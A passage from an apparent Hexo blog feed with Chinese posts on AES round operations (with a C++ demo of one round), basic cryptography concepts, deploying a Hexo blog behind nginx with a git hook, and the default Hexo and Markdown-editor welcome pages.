2.”奥卡姆剃刀“：若有多个假设与观察一致，选最简单的那个。</code></pre><h2 id="五、发展"><a href="#五、发展" class="headerlink" title="五、发展"></a>五、发展</h2><h2 id="1-符号主义学习"><a href="#1-符号主义学习" class="headerlink" title="1.符号主义学习"></a>1.符号主义学习</h2><pre><code class="hljs">    决策树、逻辑</code></pre><h2 id="2-连接主义"><a href="#2-连接主义" class="headerlink" title="2.连接主义"></a>2.连接主义</h2><pre><code class="hljs">    神经网络</code></pre><h2 id="3-统计学习"><a href="#3-统计学习" class="headerlink" title="3.统计学习"></a>3.统计学习</h2><pre><code class="hljs">    支持向量机、核方法</code></pre>]]></content>
    
    
    <categories>
      
      <category>计算机科学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>机器学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AES算法</title>
    <link href="/2020/11/04/AES/"/>
    <url>/2020/11/04/AES/</url>
    
    <content type="html"><![CDATA[<h1 id="AES数学基础"><a href="#AES数学基础" class="headerlink" title="AES数学基础"></a><code>AES数学基础</code></h1><h2 id="1-有限域GF-2-8"><a href="#1-有限域GF-2-8" class="headerlink" title="1.有限域GF(2^8)"></a>1.有限域GF(2^8)</h2><p>AES以字节为单位进行计算，一个字节8bit。</p><p>多项式表示法：01010111———&gt;x^6+x^4+x^2+x^1+x^0</p><h2 id="2-算法的基本运算"><a href="#2-算法的基本运算" class="headerlink" title="2.算法的基本运算"></a>2.算法的基本运算</h2><h3 id="（1）加法、减法"><a href="#（1）加法、减法" class="headerlink" title="（1）加法、减法"></a>（1）加法、减法</h3><p>​    <strong>异或运算：01010111+10000011=11010100</strong></p><h3 id="（2）乘法"><a href="#（2）乘法" class="headerlink" title="（2）乘法"></a>（2）乘法</h3><p>​    要计算有限域GF（2^8）上的乘法，需要确定一个GF(2)上的8次不可约多项式(除了1和自身没有任何其他因子)。</p><p>​    对于AES，这个不可约多项式确定为：m(x)=x^8+x^4+x^3+x^1+x^0 (二进制表示：0000000100011011)</p><p>​    在AES乘法中，需要将两数积mod m(x)。</p><p>​    <strong>例：01010111*10000011=11000001</strong></p><h3 id="（3）X乘运算"><a href="#（3）X乘运算" class="headerlink" title="（3）X乘运算"></a>（3）X乘运算</h3><pre><code class="hljs"> xtime()算法可用于面向字节的乘法运算。</code></pre><p>​    根据定义，xtime()运算是最高项指数不大于7的多项式b(x)乘以多项式x的乘法运算</p><p>​    例：b(x)=b7x7+b6x6+b5x5+b4x4+b3x3+b2x2+b1x+b0<br>​    xtime(b(x))=x·b(x)=(b7x8+b6x7+b5x6+b4x5+b3x4+b2x3+b1x2+b0x )mod m(x)<br>​    =(b7x8+b6x7+b5x6+b4x5+b3x4+b2x3+b1x2+b0x )mod (x8+x4+x3+x+1)</p><p>分类讨论：</p><p>（1）当b7=0：</p><p><img src="https://img-blog.csdnimg.cn/20201104210055963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（2）当b7=1：<br><img src="https://img-blog.csdnimg.cn/20201104210107640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h1 id="AES算法描述"><a href="#AES算法描述" class="headerlink" title="AES算法描述"></a>AES算法描述</h1><h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h2><p>​    分组长度：128bit        密钥长度：128bit、192bit、256bit（密钥长度不同，加密轮数不同）</p><p>​    基于Rijndael算法。</p><h2 id="2-算法原理"><a href="#2-算法原理" class="headerlink" title="2.算法原理"></a>2.算法原理</h2><p>​    <strong>例：</strong></p><p>​    已知：一轮输入状态矩阵：</p><p>​    <strong>EA 04 65 85</strong></p><p>​     <strong>83 45 5D 96</strong>  </p><pre><code class="hljs"> **5C 33 98 B0**</code></pre><p>​     <strong>F0 2D AD C5</strong></p><h3 id="（1）字节代换：关于字节的非线性变换（利用S盒）。"><a href="#（1）字节代换：关于字节的非线性变换（利用S盒）。" class="headerlink" title="（1）字节代换：关于字节的非线性变换（利用S盒）。"></a>（1）字节代换：关于字节的非线性变换（利用S盒）。</h3><p><img src="https://img-blog.csdnimg.cn/20201104210124399.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>代换结果：</p><p><strong>87 F2 4D 97<br>EC 6E 4C 90<br>4A C3  46  E7<br>8C D8 95  A6</strong></p><h3 id="（2）行位移：将状态矩阵各行进行循环位移"><a href="#（2）行位移：将状态矩阵各行进行循环位移" class="headerlink" title="（2）行位移：将状态矩阵各行进行循环位移"></a>（2）行位移：将状态矩阵各行进行循环位移</h3><p>​    第一行保持不变，第二行循环左移8bit，第三行循环左移16bit，第四行循环左移24bit</p><p>位移结果：</p><p><strong>87    f2    4d    97<br>6e    4c    90    ec       （左1）<br>46    e7    4a    c3        （左2）<br>a6    8c    d8    95</strong>        （左3）</p><h3 id="（3）列混淆：将状态矩阵右乘列混淆矩阵，这个过程称为列混淆"><a href="#（3）列混淆：将状态矩阵右乘列混淆矩阵，这个过程称为列混淆" class="headerlink" title="（3）列混淆：将状态矩阵右乘列混淆矩阵，这个过程称为列混淆"></a>（3）列混淆：将状态矩阵<strong>右乘</strong>列混淆矩阵，这个过程称为列混淆</h3><p>混淆矩阵：<br><img src="https://img-blog.csdnimg.cn/20201104210138340.png#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201104210149908.png#pic_center" alt="在这里插入图片描述"></p><p>混淆结果：</p><p><strong>47    40    a3    4c<br>37    d4    70    9f<br>94    e4    3a    42<br>ed    a5    a6    bc</strong></p><h3 id="（4）轮密钥加：用轮密钥矩阵的第-i-列，与上面得到的列混淆矩阵的第-i-列进行异或运算，得到最后的矩阵。"><a href="#（4）轮密钥加：用轮密钥矩阵的第-i-列，与上面得到的列混淆矩阵的第-i-列进行异或运算，得到最后的矩阵。" class="headerlink" title="（4）轮密钥加：用轮密钥矩阵的第 i 列，与上面得到的列混淆矩阵的第 i 列进行异或运算，得到最后的矩阵。"></a>（4）轮密钥加：用轮密钥矩阵的第 i 列，与上面得到的列混淆矩阵的第 i 列进行异或运算，得到最后的矩阵。</h3><h3 id="3-代码实现（C语言）"><a href="#3-代码实现（C语言）" class="headerlink" title="3.代码实现（C语言）"></a>3.代码实现（C语言）</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bitset&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br> <br><span class="hljs-type">int</span> a[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] = &#123;<br>    &#123;<span class="hljs-number">0x87</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x97</span>&#125;,<br>    &#123;<span class="hljs-number">0xEC</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x90</span>&#125;,<br>    &#123;<span class="hljs-number">0x4A</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xE7</span>&#125;,<br>    &#123;<span class="hljs-number">0x8C</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xA6</span>&#125;<br>&#125;;<span class="hljs-comment">//字节代换后的矩阵</span><br><span class="hljs-type">int</span> mixCol[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] = &#123;<br>    &#123;<span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>&#125;,<br>    &#123;<span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>&#125;,<br>    &#123;<span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>&#125;,<br>    &#123;<span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>&#125;<br>&#125;;<span class="hljs-comment">//列混淆矩阵</span><br><span class="hljs-type">int</span> round_key[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] = &#123;<br>    &#123;<span class="hljs-number">0xAC</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x57</span>&#125;,<br>    &#123;<span class="hljs-number">0x77</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x5C</span>&#125;,<br>    &#123;<span class="hljs-number">0x66</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x00</span>&#125;,<br>    &#123;<span class="hljs-number">0xF3</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x6A</span>&#125;,<br>&#125;;<span class="hljs-comment">//轮密钥矩阵</span><br> <br><span class="hljs-type">int</span> b[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>];<span class="hljs-comment">//行移位后的矩阵</span><br><span class="hljs-type">int</span> resMix[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>];<span class="hljs-comment">//列混淆后的矩阵</span><br><span class="hljs-type">int</span> res[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>];<span class="hljs-comment">//轮密钥加后的矩阵</span><br> <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">mul_mat</span><span class="hljs-params">(<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(x == <span class="hljs-number">0x01</span>) &#123;<br>        <span class="hljs-keyword">return</span> y;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(x == <span class="hljs-number">0x02</span>) &#123;<br>        <span class="hljs-keyword">if</span>((y&amp;<span class="hljs-number">128</span>) != <span class="hljs-number">128</span>) &#123; <span class="hljs-comment">//二进制首位为0</span><br>            <span class="hljs-keyword">return</span> y&lt;&lt;<span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">int</span> temp = ((y&lt;&lt;<span class="hljs-number">1</span>)&amp;((<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">8</span>)<span class="hljs-number">-1</span>)); <span class="hljs-comment">//向左移一位，删掉最高位(保留8位)</span><br>            <span class="hljs-keyword">return</span> temp^(<span class="hljs-number">0x1b</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(x == <span class="hljs-number">0x03</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">mul_mat</span>(<span class="hljs-number">0x02</span>,y)^y;<br>    &#125;<br>&#125;<br> <br> <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br> <br>    cout&lt;&lt;<span class="hljs-string">&quot;字节代换后的矩阵为：&quot;</span>&lt;&lt;endl;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">3</span>;i++) &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;=<span class="hljs-number">3</span>;j++) &#123;<br>            cout&lt;&lt;hex&lt;&lt;a[i][j]&lt;&lt;<span class="hljs-string">&#x27;\t&#x27;</span>;<br>        &#125;<br>        cout&lt;&lt;endl;<br>    &#125;<br> <br>    <span class="hljs-comment">//行移位</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">3</span>;i++)<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;=<span class="hljs-number">3</span>;j++)<br>            b[i][j] = a[i][(i+j)%<span class="hljs-number">4</span>];<br> <br>    cout&lt;&lt;<span class="hljs-string">&quot;行移位后的矩阵为：&quot;</span>&lt;&lt;endl;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">3</span>;i++) &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;=<span class="hljs-number">3</span>;j++) &#123;<br>            cout&lt;&lt;hex&lt;&lt;b[i][j]&lt;&lt;<span class="hljs-string">&#x27;\t&#x27;</span>;<br>        &#125;<br>        cout&lt;&lt;endl;<br>    &#125;<br> <br>    <span class="hljs-comment">//列混淆</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">3</span>;i++) &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;=<span class="hljs-number">3</span>;j++) &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;k&lt;=<span class="hljs-number">3</span>;k++) &#123;<br>                resMix[i][j] ^= <span class="hljs-built_in">mul_mat</span>(mixCol[i][k],b[k][j]);<br>            &#125;<br>        &#125;<br>    &#125;<br>    cout&lt;&lt;<span class="hljs-string">&quot;列混淆后的矩阵为：&quot;</span>&lt;&lt;endl;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">3</span>;i++) &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;=<span class="hljs-number">3</span>;j++) &#123;<br>            cout&lt;&lt;hex&lt;&lt;resMix[i][j]&lt;&lt;<span class="hljs-string">&#x27;\t&#x27;</span>;<br>        &#125;<br>        cout&lt;&lt;endl;<br>    &#125;<br> <br>    <span class="hljs-comment">//轮密钥加</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">3</span>;i++) &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;=<span class="hljs-number">3</span>;j++) &#123;<br>            res[j][i] = resMix[j][i] ^ round_key[j][i];<br>        &#125;<br>    &#125;<br>    cout&lt;&lt;<span class="hljs-string">&quot;轮密钥加后的矩阵为：&quot;</span>&lt;&lt;endl;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">3</span>;i++) &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;=<span class="hljs-number">3</span>;j++) &#123;<br>            cout&lt;&lt;hex&lt;&lt;res[i][j]&lt;&lt;<span class="hljs-string">&#x27;\t&#x27;</span>;<br>        &#125;<br>        cout&lt;&lt;endl;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>密码学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>密码学</tag>
      
      <tag>AES</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>密码学</title>
    <link href="/2020/11/03/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    <url>/2020/11/03/%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
    
    <content type="html"><![CDATA[<h1 id="密码学概念总结"><a href="#密码学概念总结" class="headerlink" title="密码学概念总结"></a>密码学概念总结</h1><blockquote><p>专注于密钥的保护而不是加密算法</p></blockquote><h2 id="1-对称密码"><a href="#1-对称密码" class="headerlink" title="1.对称密码"></a>1.对称密码</h2><pre><code class="hljs">    Alice和Bob使用相同的密钥和加密算法.    在A向B发送消息时,需要发送密钥.这会导致中间人C可以获得密钥破解密文.    因此需要好耗费人力和金钱安全传送密钥,    同时,一次会话使用一个密钥,导致密钥的保存冗杂.</code></pre><p><img src="https://img-blog.csdnimg.cn/20201103214135788.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="2-公钥密码"><a href="#2-公钥密码" class="headerlink" title="2.公钥密码"></a>2.公钥密码</h2><pre><code class="hljs">    使用公钥和密钥的加密算法.    A在网络中展示自己的公钥,所有人可以获取并使用.    B想和A通信,则从网络中获得A的公钥,并对密文进行加密.    A的私钥可以解密A的公钥加密过的密文,所以只有A能解密.    防止了中间人攻击.</code></pre><h2 id="3-混合密码"><a href="#3-混合密码" class="headerlink" title="3.混合密码"></a>3.混合密码</h2><pre><code class="hljs">    使用对称密码加密明文,使用公钥加密对称密码算法的密钥.    目的:由于使用公钥加密全部明文消耗过大,所以为了时间和资源    使用较快的对称密码加密明文,公钥仅仅需要加密key,减少工作量.</code></pre>]]></content>
    
    
    <categories>
      
      <category>密码学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>密码学</tag>
      
      <tag>概论</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo搭建博客</title>
    <link href="/2020/11/02/Hexo+Nginx+%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BABlog%E7%9B%B8%E5%85%B3/"/>
    <url>/2020/11/02/Hexo+Nginx+%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BABlog%E7%9B%B8%E5%85%B3/</url>
    
    <content type="html"><![CDATA[<h2 id="Hexo相关"><a href="#Hexo相关" class="headerlink" title="Hexo相关"></a>Hexo相关</h2><ol><li>npm hexo node安装</li><li>hexo init blog(此处建议更换国内源,提高初始化速度,github乌龟速度)</li><li>hexo g 生成静态页面,hexo s启动本地服务器, hexo d部署到github或者服务器</li></ol><h2 id="服务器相关"><a href="#服务器相关" class="headerlink" title="服务器相关"></a>服务器相关</h2><ol><li>nginx,git安装<br>如果无法建立连接，可以在本地生成ssh-keygen,将公钥保存到服务器再进行部署</li><li>nginx配置<br>a.nginx.conf<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">server &#123;<br>  <span class="hljs-comment"># 侦听80端口</span><br>  listen 80;<br>  <span class="hljs-comment"># 域名</span><br>  server_name www.catnipball.xyz;<br>  <span class="hljs-comment">#默认请求</span><br>  location / &#123;<br>    <span class="hljs-comment"># 网站根目录，此处为你的Hexo部署位置</span><br>    root /home/hexo;<br>    index index.html index.htm;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>b.hooks:post-receive</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>git --work-tree=/home/hexo --git-dir=/home/git/blog.git checkout -f<br></code></pre></td></tr></table></figure><p>c.local hexo项目</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Deployment</span><br><span class="hljs-comment"># Docs: https://hexo.io/docs/deployment.html</span><br>deploy:<br>  <span class="hljs-built_in">type</span>: git                                       <br>  repo: git@你的服务器ip:/home/git/blog.git<br>  branch: master  <br></code></pre></td></tr></table></figure><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ul><li>Nginx 403报错:将conf直接写在nginx.conf文件中;开放80端口</li><li>图片无法加载(网页图片链接在github):取消本地hexo配置中github相关</li><li>‘git’ 不是内部或外部命令，也不是可运行的程序<br>或批处理文件。  Sol：添加git到环境变量&gt;set PATH=%PATH%;C:\Program Files\Git\bin</li></ul><h2 id="主题相关"><a href="#主题相关" class="headerlink" title="主题相关"></a>主题相关</h2><ul><li>代码高亮显示：highlight:true;  然后在markdown文件里表明代码类型如C语言：csharp；</li></ul>]]></content>
    
    
    <categories>
      
      <category>网站</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Hexo</tag>
      
      <tag>阿里云</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello, Hexo!</title>
    <link href="/2020/10/28/hello-world/"/>
    <url>/2020/10/28/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>!<br>This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Markdown的使用</title>
    <link href="/2020/10/26/%E6%AC%A2%E8%BF%8E%E4%BD%BF%E7%94%A8CSDN-markdown%E7%BC%96%E8%BE%91%E5%99%A8/"/>
    <url>/2020/10/26/%E6%AC%A2%E8%BF%8E%E4%BD%BF%E7%94%A8CSDN-markdown%E7%BC%96%E8%BE%91%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>@<a href="%E8%BF%99%E9%87%8C%E5%86%99%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9B%AE%E5%BD%95%E6%A0%87%E9%A2%98">TOC</a></p><h1 id="欢迎使用Markdown编辑器"><a href="#欢迎使用Markdown编辑器" class="headerlink" title="欢迎使用Markdown编辑器"></a>欢迎使用Markdown编辑器</h1><p>你好！ 这是你第一次使用 <strong>Markdown编辑器</strong> 所展示的欢迎页。如果你想学习如何使用Markdown编辑器, 可以仔细阅读这篇文章，了解一下Markdown的基本语法知识。</p><h2 id="新的改变"><a href="#新的改变" class="headerlink" title="新的改变"></a>新的改变</h2><p>对Markdown编辑器进行了一些功能拓展与语法支持，除了标准的Markdown编辑器功能，我们增加了如下几点新功能，帮助你用它写博客：</p><ol><li><strong>全新的界面设计</strong> ，将会带来全新的写作体验；</li><li>在创作中心设置你喜爱的代码高亮样式，Markdown <strong>将代码片显示选择的高亮样式</strong> 进行展示；</li><li>增加了 <strong>图片拖拽</strong> 功能，你可以将本地的图片直接拖拽到编辑区域直接展示；</li><li>全新的 <strong>KaTeX数学公式</strong> 语法；</li><li>增加了支持<strong>甘特图的mermaid语法<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="[mermaid语法说明](https://mermaidjs.github.io/)"><a href="http://meta.math.stackexchange.com/questions/5020/mathjax-basic-tutorial-and-quick-reference">1</a></span></a></sup></strong> 功能；</li><li>增加了 <strong>多屏幕编辑</strong> Markdown文章功能；</li><li>增加了 <strong>焦点写作模式、预览模式、简洁写作模式、左右区域同步滚轮设置</strong> 等功能，功能按钮位于编辑区域与预览区域中间；</li><li>增加了 <strong>检查列表</strong> 功能。</li></ol><h2 id="功能快捷键"><a href="#功能快捷键" class="headerlink" title="功能快捷键"></a>功能快捷键</h2><p>撤销：<kbd>Ctrl/Command</kbd> + <kbd>Z</kbd><br>重做：<kbd>Ctrl/Command</kbd> + <kbd>Y</kbd><br>加粗：<kbd>Ctrl/Command</kbd> + <kbd>B</kbd><br>斜体：<kbd>Ctrl/Command</kbd> + <kbd>I</kbd><br>标题：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>H</kbd><br>无序列表：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>U</kbd><br>有序列表：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>O</kbd><br>检查列表：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>C</kbd><br>插入代码：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>K</kbd><br>插入链接：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>L</kbd><br>插入图片：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>G</kbd><br>查找：<kbd>Ctrl/Command</kbd> + <kbd>F</kbd><br>替换：<kbd>Ctrl/Command</kbd> + <kbd>G</kbd></p><h2 id="合理的创建标题，有助于目录的生成"><a href="#合理的创建标题，有助于目录的生成" class="headerlink" 